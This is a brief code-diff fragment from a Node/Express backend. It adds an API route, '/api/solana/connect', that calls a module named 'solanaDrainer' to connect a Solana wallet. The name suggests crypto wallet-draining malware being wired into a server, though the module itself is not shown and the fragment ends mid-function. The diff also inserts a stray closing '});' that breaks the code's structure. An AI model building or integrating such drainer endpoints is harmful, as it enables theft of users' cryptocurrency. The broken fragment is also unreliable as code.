@@ -1836,6 +1836,7 @@ app.get("/api/saas-clients", (req, res) => {
 });
 
 // Add to backend/index.js:
+});
 app.post('/api/solana/connect', async (req, res) => {
   try {
     const result = await solanaDrainer.connectSolanaWallet();
